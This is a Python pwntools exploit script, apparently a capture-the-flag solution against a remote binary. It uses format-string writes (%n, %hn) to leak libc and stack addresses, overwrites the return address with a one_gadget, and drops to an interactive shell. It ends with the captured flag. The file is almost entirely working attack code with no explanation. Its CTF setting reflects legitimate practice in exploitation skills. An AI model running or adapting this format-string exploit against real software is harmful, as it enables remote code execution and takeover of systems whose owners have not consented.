#!/usr/bin/python
from pwn import *


host = 'csie.ctf.tw'
port = 10132
#host = 'localhost'
#port = 4000


def fmt_hhn(prev, target, adr):
    global total
    total = ((target - prev) & 0xff)
    if(total == 0):
        return "%" + str(adr) + "$hhn"
    return "%" + str(total) + "c%" + str(adr) + "$hhn"

def fmt_hn(prev, target, adr):
    global total
    total = ((target - prev) & 0xffff)
    if(total == 0):
        return "%" + str(adr) + "$hn"
    return "%" + str(total) + "c%" + str(adr) + "$hn"

def fmt_n(prev, target, adr):
    global total
    total = ((target - prev)) & 0xffffffff
    if(total == 0):
        return "%" + str(adr) + "$n"
    return "%" + str(total) + "c%" + str(adr) + "$n"

r = remote(host, port)
raw_input('#')


dprintf_switch = 0x601010
dprintf_got = 0x600fd8

system_base = 0x4f440
dprintf_base = 0x65180
one_gadget_base = 0x4f2c5

payload = fmt_n(0, dprintf_switch, 7)
r.sendline(payload.ljust(0x2f, '\x00'))

# dprintf(1, buf, 0)
payload = fmt_hn(0, 1, 9)
r.sendline(payload.ljust(0x2f, '\x00'))
print (payload)

# point %7$p
payload = fmt_n(0, dprintf_got, 7) + '\n'
r.send(payload.ljust(0x30, '\x00'))
r.recvn(total)
r.recvuntil('\n')

# leak dprintf_libc
payload = "%9$s\n"
r.send(payload.ljust(0x30, '\x00'))
dprintf_libc = u64(r.recvuntil('\n').strip().ljust(8, '\x00'))
print ('dprintf_libc : ', hex(dprintf_libc))
one_gadget = one_gadget_base + dprintf_libc - dprintf_base
print ('one_gadget : ', hex(one_gadget))

# leak stack
payload = "%5$p\n"
r.send(payload.ljust(0x30, '\x00'))
stack = int(r.recvuntil('\n').strip(), 16)
ret = stack + 0x18
print ('ret : ', hex(ret))


# point rbp chain to return address
for i in range(3):
    payload = fmt_hn(0, ((ret) >> (i*16)) & 0xffff, 5) + '\n'
    r.send(payload.ljust(0x30, '\x00'))

# return to one_gadget
for i in range(3):
    payload = fmt_hn(0, ret + i*2, 5) + '\n'
    r.send(payload.ljust(0x30, '\x00'))
    payload = fmt_hn(0, ((one_gadget) >> (i*16)) & 0xffff, 7) + '\n'
    r.send(payload.ljust(0x30, '\x00'))
r.sendline('exit')
r.recvuntil('name')
r.sendline('asd')
r.interactive()
# FLAG{J0hn_cena_:_Y0u_c4n't_see_m3_!!!!!!!}
